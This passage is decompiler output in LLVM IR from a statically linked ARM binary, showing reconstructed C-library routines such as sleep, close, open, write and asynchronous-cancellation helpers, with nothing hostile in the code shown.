  store i32 %v5_10c14, i32* %r2.global-to-local, align 4
  %v7_10c18 = load i32, i32* inttoptr (i32 147568 to i32*), align 16
  %v4_10c1c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v4_10c1c, i32* %r0.global-to-local, align 4
  %v7_10c20 = add i32 %v7_10c18, %v0_10be4
  %v8_10c20 = inttoptr i32 %v7_10c20 to i32*
  store i32 %v5_10c14, i32* %v8_10c20, align 4
  %v0_10c24.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread22

.thread22:                                        ; preds = %dec_label_pc_10bfc, %bb29
  %v0_10c24 = phi i32 [ %v0_10c24.pre, %bb29 ], [ %v0_10bfc, %dec_label_pc_10bfc ]
  store i32 %v0_10c24, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10c28

dec_label_pc_10c28:                               ; preds = %dec_label_pc_10be0.dec_label_pc_10c28_crit_edge, %dec_label_pc_10bd4, %.thread22
  %v0_10c28 = phi i32 [ %v0_10c28.pre, %dec_label_pc_10be0.dec_label_pc_10c28_crit_edge ], [ %v0_10bd8, %dec_label_pc_10bd4 ], [ %v0_10c24, %.thread22 ]
  store i32 %v0_10c28, i32* %r0.global-to-local, align 4
  %v2_10c2c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_10c2c, i32* @r4, align 4
  ret i32 %v0_10c28

; uselistorder directives
  uselistorder i32 %v0_10c28, { 1, 0 }
  uselistorder i32 %v0_10bfc, { 1, 2, 0, 3 }
  uselistorder i32 %v0_10bb0, { 2, 0, 1 }
  uselistorder i32 %v3_10b68, { 2, 1, 0, 5, 4, 3, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 9, 10, 11, 3, 2, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 38, { 1, 0 }
  uselistorder i32 -1060, { 1, 0 }
  uselistorder i32 -1064, { 1, 0 }
  uselistorder label %dec_label_pc_10c28, { 2, 0, 1 }
  uselistorder label %.thread22, { 1, 0 }
  uselistorder label %dec_label_pc_10bd4, { 1, 0 }
  uselistorder label %bb28, { 3, 0, 1, 2 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_10c40 = load i32, i32* @r4, align 4
  %v6_10c40 = load i32, i32* @r5, align 4
  %v9_10c40 = load i32, i32* @r6, align 4
  %v12_10c40 = load i32, i32* @r7, align 4
  %v15_10c40 = load i32, i32* @lr, align 4
  store i32 0, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10c50 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* @r7, align 4
  store i32 %arg1, i32* %stack_var_-32, align 4
  br i1 %v2_10c50, label %dec_label_pc_10c64, label %dec_label_pc_10cd8

dec_label_pc_10c64:                               ; preds = %entry
  %v0_10c64 = call i32 @__aeabi_read_tp()
  %v1_10c68 = add i32 %v0_10c64, -1036
  %v2_10c68 = inttoptr i32 %v1_10c68 to i32*
  %v3_10c68 = load i32, i32* %v2_10c68, align 4
  %v1_10c6c = and i32 %v3_10c68, -71
  %v2_10c70 = icmp ugt i32 %v1_10c6c, 7
  store i1 %v2_10c70, i1* %cpsr_c.global-to-local, align 1
  %v7_10c70 = icmp eq i32 %v1_10c6c, 8
  %v1_10c74 = add i32 %v0_10c64, -1168
  store i32 %v1_10c74, i32* @r5, align 4
  br i1 %v7_10c70, label %dec_label_pc_10c7c, label %dec_label_pc_10d50

dec_label_pc_10c7c:                               ; preds = %dec_label_pc_10c64
  %v2_10c80 = add i32 %v0_10c64, -624
  %v3_10c80 = inttoptr i32 %v2_10c80 to i32*
  store i32 -1, i32* %v3_10c80, align 4
  %v0_10c84 = load i32, i32* @r5, align 4
  %v1_10c84 = add i32 %v0_10c84, 132
  store i32 %v1_10c84, i32* @r6, align 4
  br label %dec_label_pc_10c88

dec_label_pc_10c88:                               ; preds = %dec_label_pc_10cbc.dec_label_pc_10c88_crit_edge, %dec_label_pc_10c7c
  %v0_10c8c = phi i32 [ %v0_10c8c.pre, %dec_label_pc_10cbc.dec_label_pc_10c88_crit_edge ], [ %v1_10c84, %dec_label_pc_10c7c ]
  %v0_10c88 = phi i32 [ %v0_10cc4, %dec_label_pc_10cbc.dec_label_pc_10c88_crit_edge ], [ %v0_10c84, %dec_label_pc_10c7c ]
  %v1_10c88 = add i32 %v0_10c88, 132
  %v2_10c88 = inttoptr i32 %v1_10c88 to i32*
  %v3_10c88 = load i32, i32* %v2_10c88, align 4
  store i32 %v0_10c8c, i32* %r2.global-to-local, align 4
  store i32 %v3_10c88, i32* @r4, align 4
  %v1_10c9830 = inttoptr i32 %v0_10c8c to i32*
  %v2_10c9831 = load i32, i32* %v1_10c9830, align 4
  %v3_10c9c33 = icmp uge i32 %v2_10c9831, %v3_10c88
  store i1 %v3_10c9c33, i1* %cpsr_c.global-to-local, align 1
  %v9_10c9c39 = icmp eq i32 %v2_10c9831, %v3_10c88
  br i1 %v9_10c9c39, label %dec_label_pc_10ca4, label %dec_label_pc_10cbc

dec_label_pc_10ca4:                               ; preds = %dec_label_pc_10c88, %dec_label_pc_10ca4.dec_label_pc_10c98_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_10cb4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_10cb4, label %dec_label_pc_10cb8, label %dec_label_pc_10ca4.dec_label_pc_10c98_crit_edge

dec_label_pc_10ca4.dec_label_pc_10c98_crit_edge:  ; preds = %dec_label_pc_10ca4
  %v0_10c98.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_10c9c.pre = load i32, i32* @r4, align 4
  %v1_10c98 = inttoptr i32 %v0_10c98.pre to i32*
  %v2_10c98 = load i32, i32* %v1_10c98, align 4
  %v3_10c9c = icmp uge i32 %v2_10c98, %v1_10c9c.pre
  store i1 %v3_10c9c, i1* %cpsr_c.global-to-local, align 1
  %v9_10c9c = icmp eq i32 %v2_10c98, %v1_10c9c.pre
  br i1 %v9_10c9c, label %dec_label_pc_10ca4, label %dec_label_pc_10cbc

dec_label_pc_10cb8:                               ; preds = %dec_label_pc_10ca4
  %v0_10cb8 = load i32, i32* @r4, align 4
  br label %dec_label_pc_10cbc

dec_label_pc_10cbc:                               ; preds = %dec_label_pc_10c88, %dec_label_pc_10ca4.dec_label_pc_10c98_crit_edge, %dec_label_pc_10cb8
  %v0_10cbc = phi i32 [ %v0_10cb8, %dec_label_pc_10cb8 ], [ %v2_10c9831, %dec_label_pc_10c88 ], [ %v2_10c98, %dec_label_pc_10ca4.dec_label_pc_10c98_crit_edge ]
  %v1_10cbc = phi i32 [ %v0_10cb8, %dec_label_pc_10cb8 ], [ %v3_10c88, %dec_label_pc_10c88 ], [ %v1_10c9c.pre, %dec_label_pc_10ca4.dec_label_pc_10c98_crit_edge ]
  %v3_10cbc = icmp uge i32 %v0_10cbc, %v1_10cbc
  store i1 %v3_10cbc, i1* %cpsr_c.global-to-local, align 1
  %v9_10cbc = icmp eq i32 %v0_10cbc, %v1_10cbc
  br i1 %v9_10cbc, label %dec_label_pc_10cc4, label %dec_label_pc_10cbc.dec_label_pc_10c88_crit_edge

dec_label_pc_10cbc.dec_label_pc_10c88_crit_edge:  ; preds = %dec_label_pc_10cbc
  %v0_10cc4 = load i32, i32* @r5, align 4
  %v0_10c8c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_10c88

dec_label_pc_10cc4:                               ; preds = %dec_label_pc_10cbc
  %v0_10ccc = load i32, i32* @r7, align 4
  %v2_10ccc = add i32 %v0_10ccc, 124
  %v3_10ccc = inttoptr i32 %v2_10ccc to i32*
  %v4_10ccc = load i32, i32* %v3_10ccc, align 4
  store i32 68824, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_10ccc)
  %v0_10ce0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10cd8

dec_label_pc_10cd8:                               ; preds = %entry, %dec_label_pc_10cc4
  %v0_10ce0 = phi i32 [ 0, %entry ], [ %v0_10ce0.pre, %dec_label_pc_10cc4 ]
  %v2_10ce4 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_10ce4, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %stack_var_-40, align 4
  %v3_10cf0 = call i32 @__libc_sigaction(i32 17, i32 %v0_10ce0, i32 %v2_10ce4)
  %v3_10cf4 = load i32, i32* %stack_var_-60, align 4
  %v2_10cf8 = icmp ne i32 %v3_10cf4, 0
  store i1 %v2_10cf8, i1* %cpsr_c.global-to-local, align 1
  %v7_10cf8 = icmp eq i32 %v3_10cf4, 1
  br i1 %v7_10cf8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_10cd8
  %v3_10cfc = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_10cfc, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_10cd8, %bb
  call void @__pseudo_cond_branch(i1 %v7_10cf8, i32 ptrtoint (i32* @global_var_12358.682 to i32))
  %v2_10d0c = ptrtoint i32* %stack_var_-32 to i32
  %v2_10d14 = call i32 @__libc_nanosleep(i32 %v2_10d0c, i32 %v2_10d0c)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10d18 = icmp eq i32 %v2_10d14, 0
  br i1 %v2_10d18, label %bb26, label %bb25

bb25:                                             ; preds = %.thread1
  store i32 499999999, i32* %r2.global-to-local, align 4
  %v3_10d2c = load i32, i32* %stack_var_-32, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br label %bb26

bb26:                                             ; preds = %.thread1, %bb25
  %storemerge = phi i32 [ %v3_10d2c, %bb25 ], [ 0, %.thread1 ]
  store i32 %storemerge, i32* @r4, align 4
  %v3_10d3c = load i32, i32* %stack_var_-40, align 4
  %v1_10d40 = and i32 %v3_10d3c, 65536
  store i32 %v1_10d40, i32* %r2.global-to-local, align 4
  %v2_10d40 = icmp eq i32 %v1_10d40, 0
  br i1 %v2_10d40, label %bb27, label %.thread5

bb27:                                             ; preds = %bb26
  br label %.thread5

.thread5:                                         ; preds = %bb26, %bb27
  call void @__pseudo_cond_branch(i1 %v2_10d40, i32 ptrtoint (i32* @global_var_12358.682 to i32))
  br label %dec_label_pc_10d50

dec_label_pc_10d50:                               ; preds = %dec_label_pc_10c64, %.thread5
  %v0_10d50 = load i32, i32* @r4, align 4
  store i32 %v3_10c40, i32* @r4, align 4
  store i32 %v6_10c40, i32* @r5, align 4
  store i32 %v9_10c40, i32* @r6, align 4
  store i32 %v12_10c40, i32* @r7, align 4
  store i32 %v15_10c40, i32* @lr, align 4
  ret i32 %v0_10d50

; uselistorder directives
  uselistorder i32 %v0_10cb8, { 1, 0 }
  uselistorder i32 %v1_10c9c.pre, { 0, 2, 1 }
  uselistorder i32* %stack_var_-40, { 0, 2, 1 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7, 8 }
  uselistorder label %dec_label_pc_10d50, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_10cd8, { 1, 0 }
  uselistorder label %dec_label_pc_10cbc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10ca4, { 1, 0 }
}

define i32 @function_10d64(i32 %arg1) local_unnamed_addr {
dec_label_pc_10d64:
  %v0_10d64 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10d64, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_10d64
  %v2_10d64 = load i32, i32* @ip, align 4
  %v4_10d64 = lshr i32 %v2_10d64, %arg1
  %v5_10d64 = sub i32 32, %arg1
  %v6_10d64 = shl i32 %v2_10d64, %v5_10d64
  %v7_10d64 = or i32 %v6_10d64, %v4_10d64
  %v9_10d64 = and i32 %v7_10d64, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_10d64, %bb
  %v4_10d70 = phi i32 [ %arg1, %dec_label_pc_10d64 ], [ %v9_10d64, %bb ]
  ret i32 %v4_10d70

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI___close_nocancel() local_unnamed_addr {
entry:
  %v0_10d84 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_10d84, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_10d84 = load i32, i32* @r0, align 4
  ret i32 %v2_10d84

bb1:                                              ; preds = %entry
  %v0_10d88 = call i32 @__syscall_error()
  ret i32 %v0_10d88
}

define i32 @__GI___libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10d94 = load i32, i32* @global_var_27c38.685, align 4
  %v2_10d98 = icmp eq i32 %v3_10d94, 0
  store i1 %v2_10d98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10d98, label %dec_label_pc_10da0, label %entry.dec_label_pc_10dbc_crit_edge

entry.dec_label_pc_10dbc_crit_edge:               ; preds = %entry
  %v3_10dbc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_10dbc

dec_label_pc_10da0:                               ; preds = %entry
  %v0_10da0 = load i32, i32* @r7, align 4
  store i32 %v0_10da0, i32* @ip, align 4
  %v0_10db0 = load i32, i32* @r0, align 4
  %v2_10db0 = icmp ugt i32 %v0_10db0, -4097
  %v7_10db0 = icmp eq i32 %v0_10db0, -4096
  store i1 %v7_10db0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10db0, label %bb7, label %bb

bb:                                               ; preds = %dec_label_pc_10dbc, %bb8, %bb9, %dec_label_pc_10da0
  %merge2 = phi i32 [ %v0_10db0, %dec_label_pc_10da0 ], [ %v0_10de0, %dec_label_pc_10dbc ], [ %v0_10df0, %bb8 ], [ %v0_10df0, %bb9 ]
  ret i32 %merge2

bb7:                                              ; preds = %dec_label_pc_10da0
  %v0_10db8 = call i32 @__syscall_error()
  br label %dec_label_pc_10dbc

dec_label_pc_10dbc:                               ; preds = %entry.dec_label_pc_10dbc_crit_edge, %bb7
  %v3_10dbc = phi i32 [ %v3_10dbc.pre, %entry.dec_label_pc_10dbc_crit_edge ], [ %v0_10db8, %bb7 ]
  %v9_10dbc = load i32, i32* @r7, align 4
  store i32 %v9_10dbc, i32* %stack_var_-8, align 4
  %v12_10dbc = load i32, i32* @lr, align 4
  %v0_10dc0 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_10dc0, i32* @ip, align 4
  store i32 %v3_10dbc, i32* @r7, align 4
  %v1_10ddc = call i32 @__libc_disable_asynccancel(i32 %v0_10dc0)
  %v0_10de0 = load i32, i32* @r7, align 4
  store i32 %v0_10de0, i32* @r0, align 4
  %v2_10de4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10de4, i32* @r7, align 4
  store i32 %v12_10dbc, i32* @lr, align 4
  %v2_10de8 = icmp ugt i32 %v0_10de0, -4097
  %v7_10de8 = icmp eq i32 %v0_10de0, -4096
  store i1 %v7_10de8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10de8, label %bb8, label %bb

bb8:                                              ; preds = %dec_label_pc_10dbc
  %v0_10df0 = call i32 @__syscall_error()
  %v0_10e00 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10e00, label %bb9, label %bb

bb9:                                              ; preds = %bb8
  %v1_10e00 = load i32, i32* @r1, align 4
  %v2_10e00 = load i32, i32* @ip, align 4
  %v5_10e00 = mul i32 %v2_10e00, 268435456
  %v6_10e00 = and i32 %v5_10e00, %v1_10e00
  store i32 %v6_10e00, i32* @r6, align 4
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_10df0, { 1, 0 }
  uselistorder i32 %v0_10de0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_10db0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10dbc, { 1, 0 }
  uselistorder label %bb, { 2, 1, 0, 3 }
}

define i32 @__GI___open_nocancel() local_unnamed_addr {
entry:
  %v0_10e14 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_10e14, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_10e14 = load i32, i32* @r0, align 4
  ret i32 %v2_10e14

bb1:                                              ; preds = %entry
  %v0_10e18 = call i32 @__syscall_error()
  ret i32 %v0_10e18
}

define i32 @__libc_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_10e24 = load i32, i32* @global_var_27c38.685, align 4
  %v2_10e28 = icmp eq i32 %v3_10e24, 0
  store i1 %v2_10e28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10e28, label %dec_label_pc_10e30, label %entry.dec_label_pc_10e4c_crit_edge

entry.dec_label_pc_10e4c_crit_edge:               ; preds = %entry
  %v3_10e4c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_10e4c

dec_label_pc_10e30:                               ; preds = %entry
  %v0_10e30 = load i32, i32* @r7, align 4
  store i32 %v0_10e30, i32* @ip, align 4
  %v0_10e40 = load i32, i32* @r0, align 4
  %v2_10e40 = icmp ugt i32 %v0_10e40, -4097
  %v7_10e40 = icmp eq i32 %v0_10e40, -4096
  store i1 %v7_10e40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10e40, label %bb9, label %bb

bb:                                               ; preds = %dec_label_pc_10e4c, %bb10, %bb11, %dec_label_pc_10e30
  %merge2 = phi i32 [ %v0_10e40, %dec_label_pc_10e30 ], [ %v0_10e70, %dec_label_pc_10e4c ], [ %v0_10e80, %bb10 ], [ %v0_10e80, %bb11 ]
  ret i32 %merge2

bb9:                                              ; preds = %dec_label_pc_10e30
  %v0_10e48 = call i32 @__syscall_error()
  br label %dec_label_pc_10e4c

dec_label_pc_10e4c:                               ; preds = %entry.dec_label_pc_10e4c_crit_edge, %bb9
  %v3_10e4c = phi i32 [ %v3_10e4c.pre, %entry.dec_label_pc_10e4c_crit_edge ], [ %v0_10e48, %bb9 ]
  store i32 %v3_10e4c, i32* %stack_var_-24, align 4
  %v9_10e4c = load i32, i32* @r2, align 4
  %v12_10e4c = load i32, i32* @r3, align 4
  %v15_10e4c = load i32, i32* @r7, align 4
  store i32 %v15_10e4c, i32* %stack_var_-8, align 4
  %v18_10e4c = load i32, i32* @lr, align 4
  %v0_10e50 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_10e50, i32* @ip, align 4
  %v2_10e58 = load i32, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %v9_10e4c, i32* @r2, align 4
  store i32 %v12_10e4c, i32* @r3, align 4
  store i32 %v2_10e58, i32* @r7, align 4
  %v1_10e6c = call i32 @__libc_disable_asynccancel(i32 %v0_10e50)
  %v0_10e70 = load i32, i32* @r7, align 4
  store i32 %v0_10e70, i32* @r0, align 4
  %v2_10e74 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10e74, i32* @r7, align 4
  store i32 %v18_10e4c, i32* @lr, align 4
  %v2_10e78 = icmp ugt i32 %v0_10e70, -4097
  %v7_10e78 = icmp eq i32 %v0_10e70, -4096
  store i1 %v7_10e78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10e78, label %bb10, label %bb

bb10:                                             ; preds = %dec_label_pc_10e4c
  %v0_10e80 = call i32 @__syscall_error()
  %v0_10e90 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10e90, label %bb11, label %bb

bb11:                                             ; preds = %bb10
  %v1_10e90 = load i32, i32* @r1, align 4
  %v2_10e90 = load i32, i32* @ip, align 4
  %v3_10e90 = load i32, i32* @sp, align 4
  %v4_10e90 = lshr i32 %v2_10e90, %v3_10e90
  %v5_10e90 = sub i32 32, %v3_10e90
  %v6_10e90 = shl i32 %v2_10e90, %v5_10e90
  %v7_10e90 = or i32 %v6_10e90, %v4_10e90
  %v9_10e90 = and i32 %v7_10e90, %v1_10e90
  store i32 %v9_10e90, i32* @r6, align 4
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_10e80, { 1, 0 }
  uselistorder i32 %v0_10e70, { 0, 2, 3, 1 }
  uselistorder i32 %v0_10e40, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10e4c, { 1, 0 }
  uselistorder label %bb, { 2, 1, 0, 3 }
}

define i32 @__GI___write_nocancel() local_unnamed_addr {
entry:
  %v0_10ea4 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_10ea4, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_10ea4 = load i32, i32* @r0, align 4
  ret i32 %v2_10ea4

bb1:                                              ; preds = %entry
  %v0_10ea8 = call i32 @__syscall_error()
  ret i32 %v0_10ea8
}

define i32 @__GI___libc_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_10eb4 = load i32, i32* @global_var_27c38.685, align 4
  %v2_10eb8 = icmp eq i32 %v3_10eb4, 0
  br i1 %v2_10eb8, label %dec_label_pc_10ec0, label %entry.dec_label_pc_10edc_crit_edge

entry.dec_label_pc_10edc_crit_edge:               ; preds = %entry
  %v3_10edc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_10edc

dec_label_pc_10ec0:                               ; preds = %entry
  %v0_10ec0 = load i32, i32* @r7, align 4
  store i32 %v0_10ec0, i32* @ip, align 4
  %v0_10ed0 = load i32, i32* @r0, align 4
  %v2_10ed0 = icmp ugt i32 %v0_10ed0, -4097
  br i1 %v2_10ed0, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_10edc, %dec_label_pc_10ec0
  %merge = phi i32 [ %v0_10ed0, %dec_label_pc_10ec0 ], [ %v0_10f00, %dec_label_pc_10edc ]
  ret i32 %merge

bb8:                                              ; preds = %dec_label_pc_10ec0
  %v0_10ed8 = call i32 @__syscall_error()
  br label %dec_label_pc_10edc

dec_label_pc_10edc:                               ; preds = %entry.dec_label_pc_10edc_crit_edge, %bb8
  %v3_10edc = phi i32 [ %v3_10edc.pre, %entry.dec_label_pc_10edc_crit_edge ], [ %v0_10ed8, %bb8 ]
  store i32 %v3_10edc, i32* %stack_var_-24, align 4
  %v12_10edc = load i32, i32* @r3, align 4
  %v15_10edc = load i32, i32* @r7, align 4
  store i32 %v15_10edc, i32* %stack_var_-8, align 4
  %v18_10edc = load i32, i32* @lr, align 4
  %v0_10ee0 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_10ee0, i32* @ip, align 4
  %v2_10ee8 = load i32, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %v12_10edc, i32* @r3, align 4
  store i32 %v2_10ee8, i32* @r7, align 4
  %v1_10efc = call i32 @__libc_disable_asynccancel(i32 %v0_10ee0)
  %v0_10f00 = load i32, i32* @r7, align 4
  store i32 %v0_10f00, i32* @r0, align 4
  %v2_10f04 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10f04, i32* @r7, align 4
  store i32 %v18_10edc, i32* @lr, align 4
  %v2_10f08 = icmp ugt i32 %v0_10f00, -4097
  br i1 %v2_10f08, label %bb9, label %bb

bb9:                                              ; preds = %dec_label_pc_10edc
  %v0_10f10 = call i32 @__syscall_error()
  ret i32 %v0_10f10

; uselistorder directives
  uselistorder i32 %v0_10f00, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10edc, { 1, 0 }
}

define i32 @__libc_disable_asynccancel(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_10f20 = load i32, i32* %r0.global-to-local, align 4
  %v1_10f20 = and i32 %v0_10f20, 2
  %v2_10f20 = icmp eq i32 %v1_10f20, 0
  %v3_10f24 = load i32, i32* @r4, align 4
  store i32 %v3_10f24, i32* %stack_var_-16, align 4
  br i1 %v2_10f20, label %dec_label_pc_10f2c, label %dec_label_pc_10fa0

dec_label_pc_10f2c:                               ; preds = %entry
  %v0_10f2c = call i32 @__aeabi_read_tp()
  store i32 %v0_10f2c, i32* %r0.global-to-local, align 4
  %v1_10f30 = add i32 %v0_10f2c, -1036
  %v2_10f30 = inttoptr i32 %v1_10f30 to i32*
  %v3_10f30 = load i32, i32* %v2_10f30, align 4
  %v1_10f34 = add i32 %v0_10f2c, -1168
  store i32 %v1_10f34, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10f38

dec_label_pc_10f38:                               ; preds = %dec_label_pc_10f6c.dec_label_pc_10f38_crit_edge, %dec_label_pc_10f2c
  %v0_10f44 = phi i32 [ %v0_10f44.pre, %dec_label_pc_10f6c.dec_label_pc_10f38_crit_edge ], [ %v1_10f34, %dec_label_pc_10f2c ]
  %v0_10f38 = phi i32 [ %v0_10f6c, %dec_label_pc_10f6c.dec_label_pc_10f38_crit_edge ], [ %v3_10f30, %dec_label_pc_10f2c ]
  %v1_10f38 = and i32 %v0_10f38, -3
  store i32 %v1_10f38, i32* %r7.global-to-local, align 4
  store i32 %v0_10f38, i32* %r4.global-to-local, align 4
  store i32 %v1_10f38, i32* @r1, align 4
  %v1_10f44 = add i32 %v0_10f44, 132
  store i32 %v1_10f44, i32* @r2, align 4
  %v1_10f4823 = inttoptr i32 %v1_10f44 to i32*
  %v2_10f4824 = load i32, i32* %v1_10f4823, align 4
  %v3_10f4c26 = icmp uge i32 %v2_10f4824, %v0_10f38
  store i1 %v3_10f4c26, i1* %cpsr_c.global-to-local, align 1
  %v9_10f4c32 = icmp eq i32 %v2_10f4824, %v0_10f38
  br i1 %v9_10f4c32, label %dec_label_pc_10f54, label %dec_label_pc_10f6c

dec_label_pc_10f54:                               ; preds = %dec_label_pc_10f38, %dec_label_pc_10f54.dec_label_pc_10f48_crit_edge
  %v0_10f5433 = phi i32 [ %v1_10f4c.pre, %dec_label_pc_10f54.dec_label_pc_10f48_crit_edge ], [ %v0_10f38, %dec_label_pc_10f38 ]
  store i32 %v0_10f5433, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_10f64 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_10f64, label %dec_label_pc_10f68, label %dec_label_pc_10f54.dec_label_pc_10f48_crit_edge

dec_label_pc_10f54.dec_label_pc_10f48_crit_edge:  ; preds = %dec_label_pc_10f54
  %v0_10f48.pre = load i32, i32* @r2, align 4
  %v1_10f4c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_10f48 = inttoptr i32 %v0_10f48.pre to i32*
  %v2_10f48 = load i32, i32* %v1_10f48, align 4
  %v3_10f4c = icmp uge i32 %v2_10f48, %v1_10f4c.pre
  store i1 %v3_10f4c, i1* %cpsr_c.global-to-local, align 1
  %v9_10f4c = icmp eq i32 %v2_10f48, %v1_10f4c.pre
  br i1 %v9_10f4c, label %dec_label_pc_10f54, label %dec_label_pc_10f6c

dec_label_pc_10f68:                               ; preds = %dec_label_pc_10f54
  %v0_10f68 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10f6c

dec_label_pc_10f6c:                               ; preds = %dec_label_pc_10f38, %dec_label_pc_10f54.dec_label_pc_10f48_crit_edge, %dec_label_pc_10f68
  %v0_10f6c = phi i32 [ %v0_10f68, %dec_label_pc_10f68 ], [ %v2_10f4824, %dec_label_pc_10f38 ], [ %v2_10f48, %dec_label_pc_10f54.dec_label_pc_10f48_crit_edge ]
  %v1_10f6c = phi i32 [ %v0_10f68, %dec_label_pc_10f68 ], [ %v0_10f38, %dec_label_pc_10f38 ], [ %v1_10f4c.pre, %dec_label_pc_10f54.dec_label_pc_10f48_crit_edge ]
  %v3_10f6c = icmp uge i32 %v0_10f6c, %v1_10f6c
  store i1 %v3_10f6c, i1* %cpsr_c.global-to-local, align 1
  %v9_10f6c = icmp eq i32 %v0_10f6c, %v1_10f6c
  br i1 %v9_10f6c, label %dec_label_pc_10f94.preheader, label %dec_label_pc_10f6c.dec_label_pc_10f38_crit_edge

dec_label_pc_10f6c.dec_label_pc_10f38_crit_edge:  ; preds = %dec_label_pc_10f6c
  %v0_10f44.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10f38

dec_label_pc_10f94.preheader:                     ; preds = %dec_label_pc_10f6c
  %v0_10f941 = load i32, i32* %r7.global-to-local, align 4
  %v1_10f942 = and i32 %v0_10f941, 12
  store i32 %v1_10f942, i32* @r3, align 4
  %v2_10f983 = icmp ugt i32 %v1_10f942, 3
  store i1 %v2_10f983, i1* %cpsr_c.global-to-local, align 1
  %v7_10f985 = icmp eq i32 %v1_10f942, 4
